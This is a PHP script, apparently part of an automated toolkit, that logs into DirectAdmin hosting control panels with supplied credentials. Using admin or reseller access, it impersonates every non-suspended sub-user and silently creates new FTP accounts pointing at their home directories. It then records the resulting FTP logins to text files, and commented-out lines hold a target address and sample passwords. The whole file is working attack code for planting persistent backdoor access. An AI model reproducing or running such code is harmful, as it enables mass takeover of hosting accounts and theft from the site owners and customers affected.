<?php

set_time_limit(0);
ini_set('max_execution_time', 0);

$mypid = getmypid();

$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
$dir['script'] = realpath($dir['script'] . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR);
$dir['includes'] = realpath($dir['script'] . DIRECTORY_SEPARATOR . 'includes' . DIRECTORY_SEPARATOR);
$dir['cache'] = realpath($dir['script'] . DIRECTORY_SEPARATOR . 'cache' . DIRECTORY_SEPARATOR);
$dir['modules'] = realpath($dir['script'] . DIRECTORY_SEPARATOR . 'modules' . DIRECTORY_SEPARATOR);
$dir['cur_logs'] = file_get_contents($dir['cache'] . DIRECTORY_SEPARATOR . 'cur_logs.txt');

file_put_contents($dir['script'] . DIRECTORY_SEPARATOR . 'cache' . DIRECTORY_SEPARATOR . 'imports' . DIRECTORY_SEPARATOR . $mypid, 1);

function createPassword($length) {
	$chars = '1234567890!#$abcdefghijkmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$password = '';
	for($i = 0; $i < $length; $i++){
		$password .= @$chars[mt_rand(0, strlen($chars)-1)];
	}
	return $password;
}

function error_handler($code, $msg, $file, $line){
	global $dir;
	$error = array();
	$error['code'] = $code;
	$error['msg'] = $msg;
	$error['file'] = $file;
	$error['line'] = $line;
	file_put_contents($dir['cur_logs'] . '/errors_php.txt', print_r($error, true) . "\r\n", FILE_APPEND);
}

set_error_handler('error_handler');

$site = base64_decode($_SERVER['argv'][1]);

$site = explode("@@@", $site);
$site[0] = rtrim($site[0], '/');
$site[1] = explode(":", $site[1]);

/*
$site[0] = 'http://193.43.134.66:2222/';
$site[1][0] = 'reseller';
$site[1][1] = '123123123';
*/
//$site[1][0] = 'admin';
//$site[1][1] = 'BqL6Y8AbTL';
//$site[1][0] = 'test1';
//$site[1][1] = '123321';


require($dir['includes'] . '/curl.class.php');

$cookie = $dir['cache'] . DIRECTORY_SEPARATOR . md5($site[0].time().mt_rand(1000,99999)) . '.txt';

$http = new get_http();
$http->config['post'] = true;
$http->config['postFields'] = 'referer=%2F&username='.$site[1][0].'&password='.$site[1][1].'';
$http->config['cookieFileLocation'] = $cookie;
$http->config['followlocation'] = true;
$http->config['referer'] = $site[0] . '/CMD_LOGIN';
$http->open($site[0] . '/CMD_LOGIN');

if($http->status == 200 && !empty($http->webpage)){
	if(stripos($http->webpage, 'DirectAdmin Login Page') === false){
		if(stripos($http->webpage, 'IMG_SKIN_CTRL_ACCESS') != false){			if(stripos($http->webpage, 'Admin Level') != false){				$http->clear($cookie);
				$http->config['followlocation'] = false;
				$http->config['referer'] = $site[0];
				$http->open($site[0] . '/CMD_ALL_USER_SHOW');

				if($http->status == 200 && !empty($http->webpage)){
					preg_match_all('~<form name=tableform action=\'/CMD_SELECT_USERS\' method=\'GET\'>(.*)</form>~isU', $http->webpage, $match, PREG_SET_ORDER);

					if(count($match) == 1){
						preg_match_all('~<tr(.*)<\/tr~isU', $match[0][1], $match, PREG_SET_ORDER);
						if(count($match) > 0){
							foreach($match as $item){
								preg_match_all('~<td class=(list|list2)>(.*)<\/td~isU', $item[1], $match, PREG_SET_ORDER);
								if(count($match) == 8){
									if(strtolower($match[4][2]) == 'no'){
										$cpuser = strip_tags($match[0][2]);
										$ip = strip_tags($match[6][2]);
										$cookie_sub = $dir['cache'] . DIRECTORY_SEPARATOR . md5($cpuser.$ip). '.txt';

										if(copy($cookie, $cookie_sub)){
                                            $http->clear($cookie_sub);
											$http->config['post'] = true;
											$http->config['postFields'] = 'username=admin%7C' . $cpuser;
											$http->config['referer'] = $site[0];
											$http->config['followlocation'] = false;
											$http->open($site[0] . '/CMD_LOGIN');

											if($http->status == 302){
												$http->clear($cookie_sub);
												$http->config['referer'] = $site[0];
												$http->config['followlocation'] = false;
												$http->open($site[0] . '/CMD_ADDITIONAL_DOMAINS');

												if($http->status == 200 && !empty($http->webpage)){
													preg_match_all('~<td class=list><a href=\'/(.*)\'><b>(.*)</b></a>~isU', $http->webpage, $imatch, PREG_SET_ORDER);
													if(!empty($imatch[0][2])){
														$user = 'bdaa' . mt_rand(10, 999);
														$pwd = createPassword(8);

														$http->clear($cookie_sub);
														$http->config['post'] = true;
														$http->config['postFields'] = 'action=create&domain='.$imatch[0][2].'&user='.$user.'&passwd='.$pwd.'&random='.$pwd.'&passwd2='.$pwd.'&type=custom&custom_val='.urlencode('/home/'.$cpuser).'&create=Create';
														$http->config['referer'] = $site[0] . '/HTM_FTP_CREATE?DOMAIN='.$imatch[0][2].'&owned=no';
														$http->config['followlocation'] = false;
														$http->open($site[0] . '/CMD_FTP');

														if($http->status == 302){
															file_put_contents($dir['script'] . '/ftps.txt', 'ftp://'.$user.'@'.$imatch[0][2].':'.$pwd.'@'.$ip.':21/' . "\r\n", FILE_APPEND);
															file_put_contents($dir['script'] . '/ftps_ok.txt', base64_decode($_SERVER['argv'][1]) . ' - user('.$cpuser.') - ftp://'.$user.'@'.$match[0][2].':'.$pwd.'@'.$match[0][2].':21/' . "\r\n", FILE_APPEND);
														}else{
															file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' add_ftps_from_admin (' . $cpuser. ")\r\n", FILE_APPEND);
														}
													}else{
														file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' search_main_domain_from_admin (' . $cpuser. ")\r\n", FILE_APPEND);
													}
												}else{
													file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' get_main_domain_from_admin (' . $cpuser. ")\r\n", FILE_APPEND);
												}
											}else{
												file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' autorize_from_admin (' . $cpuser. ")\r\n", FILE_APPEND);
											}
										}else{
											file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' copy_cookie_admin (' . $cpuser. ")\r\n", FILE_APPEND);
										}
									}
								}
							}
						}else{
							file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' get_domains_admin_3' . "\r\n", FILE_APPEND);
						}
					}else{
						file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' get_domains_admin_2' . "\r\n", FILE_APPEND);
					}
				}else{
					file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' get_domains_admin_1' . "\r\n", FILE_APPEND);
				}
			}elseif(stripos($http->webpage, 'Reseller Level') != false){
				$http->clear($cookie);
				$http->config['followlocation'] = false;
				$http->config['referer'] = $site[0];
				$http->open($site[0] . '/CMD_USER_SHOW');

				if($http->status == 200 && !empty($http->webpage)){
					preg_match_all('~<form name=tableform action=\'/CMD_SELECT_USERS\' method=\'GET\'>(.*)</form>~isU', $http->webpage, $match, PREG_SET_ORDER);

					if(count($match) == 1){
						preg_match_all('~<tr(.*)<\/tr~isU', $match[0][1], $match, PREG_SET_ORDER);
						if(count($match) > 0){
							foreach($match as $item){
								preg_match_all('~<td class=(list|list2)>(.*)<\/td~isU', $item[1], $match, PREG_SET_ORDER);

								if(count($match) == 7){
									if(strtolower($match[4][2]) == 'no'){
										$cpuser = strip_tags($match[0][2]);
										$ip = strip_tags($match[5][2]);
										$cookie_sub = $dir['cache'] . DIRECTORY_SEPARATOR . md5($cpuser.$ip). '.txt';

										if(copy($cookie, $cookie_sub)){
                                            $http->clear($cookie_sub);
											$http->config['post'] = true;
											$http->config['postFields'] = 'username=reseller%7C' . $cpuser;
											$http->config['referer'] = $site[0];
											$http->config['followlocation'] = false;
											$http->open($site[0] . '/CMD_LOGIN');

											if($http->status == 302){
												$http->clear($cookie_sub);
												$http->config['referer'] = $site[0];
												$http->config['followlocation'] = false;
												$http->open($site[0] . '/CMD_ADDITIONAL_DOMAINS');

												if($http->status == 200 && !empty($http->webpage)){
													preg_match_all('~<td class=list><a href=\'/(.*)\'><b>(.*)</b></a>~isU', $http->webpage, $imatch, PREG_SET_ORDER);
                                                    //print_r($match);
													if(!empty($imatch[0][2])){
														$user = 'bdar' . mt_rand(10, 999);
														$pwd = createPassword(8);

														$http->clear($cookie_sub);
														$http->config['post'] = true;
														$http->config['postFields'] = 'action=create&domain='.$imatch[0][2].'&user='.$user.'&passwd='.$pwd.'&random='.$pwd.'&passwd2='.$pwd.'&type=custom&custom_val='.urlencode('/home/'.$cpuser).'&create=Create';
														$http->config['referer'] = rtrim($site[0], '/') . '/HTM_FTP_CREATE?DOMAIN='.$imatch[0][2].'&owned=no';
														$http->config['followlocation'] = false;
														$http->open($site[0] . '/CMD_FTP');

														if($http->status == 302){
															file_put_contents($dir['script'] . '/ftps.txt', 'ftp://'.$user.'@'.$imatch[0][2].':'.$pwd.'@'.$ip.':21/' . "\r\n", FILE_APPEND);
															file_put_contents($dir['script'] . '/ftps_ok.txt', base64_decode($_SERVER['argv'][1]) . ' - user('.$cpuser.') - ftp://'.$user.'@'.$match[0][2].':'.$pwd.'@'.$match[0][2].':21/' . "\r\n", FILE_APPEND);
														}else{
															file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' add_ftps_from_reseller (' . $cpuser. ")\r\n", FILE_APPEND);
														}
													}else{
														file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' search_main_domain_from_reseller (' . $cpuser. ")\r\n", FILE_APPEND);
													}
												}else{
													file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' get_main_domain_from_reseller (' . $cpuser. ")\r\n", FILE_APPEND);
												}
											}else{
												file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' autorize_from_reseller (' . $cpuser. ")\r\n", FILE_APPEND);
											}
										}else{
											file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' copy_cookie_reselle (' . $cpuser. ")\r\n", FILE_APPEND);
										}
									}
								}
							}
						}else{
							file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' get_domains_reseller_3' . "\r\n", FILE_APPEND);
						}
					}else{
						file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' get_domains_reseller_2' . "\r\n", FILE_APPEND);
					}
				}else{
					file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' get_domains_reseller_1' . "\r\n", FILE_APPEND);
				}
			}
		}else{			preg_match_all('~<div class="right-pad">(.*)<b>(.*)</b>(.*)</div>~isU', $http->webpage, $match, PREG_SET_ORDER);

			if(!empty($match[0][2])){				$user = 'bda' . mt_rand(10, 999);
	    		$pwd = createPassword(10);

	    		$http->clear($cookie);
				$http->config['post'] = true;
				$http->config['postFields'] = 'action=create&domain='.$match[0][2].'&user='.$user.'&passwd='.$pwd.'&random='.$pwd.'&passwd2='.$pwd.'&type=custom&custom_val='.urlencode('/home/'.$site[1][0].'/').'&create=Create';
				$http->config['referer'] = $site[0] . '/HTM_FTP_CREATE?DOMAIN='.$match[0][2].'&owned=yes';
				$http->config['followlocation'] = false;
				$http->open($site[0] . '/CMD_FTP');

				if($http->status == 302){
					file_put_contents($dir['script'] . '/ftps.txt', 'ftp://'.$user.':'.$pwd.'@'.$match[0][2].':21/' . "\r\n", FILE_APPEND);
					file_put_contents($dir['script'] . '/ftps.txt', 'ftp://'.$user.'@'.$match[0][2].':'.$pwd.'@'.$match[0][2].':21/' . "\r\n", FILE_APPEND);

					file_put_contents($dir['script'] . '/ftps_ok.txt', base64_decode($_SERVER['argv'][1]) . ' - ftp://'.$user.'@'.$match[0][2].':'.$pwd.'@'.$match[0][2].':21/' . "\r\n", FILE_APPEND);
				}else{					file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' add_ftps_1' . "\r\n", FILE_APPEND);
				}
			}else{
		    	file_put_contents($dir['script'] . '/errors.txt', base64_decode($_SERVER['argv'][1]) . ' - ' . ' get_main_domain' . "\r\n", FILE_APPEND);
		    }
		}
    }else{    	file_put_contents($dir['cur_logs'] . '/errors_autorize.txt', base64_decode($_SERVER['argv'][1]) . "\r\n", FILE_APPEND);
    }
}else{
	file_put_contents($dir['cur_logs'] . '/errors_autorize.txt', base64_decode($_SERVER['argv'][1]) . "\r\n", FILE_APPEND);
}

@unlink($dir['script'] . DIRECTORY_SEPARATOR . 'cache' . DIRECTORY_SEPARATOR . 'imports' . DIRECTORY_SEPARATOR . $mypid);

?>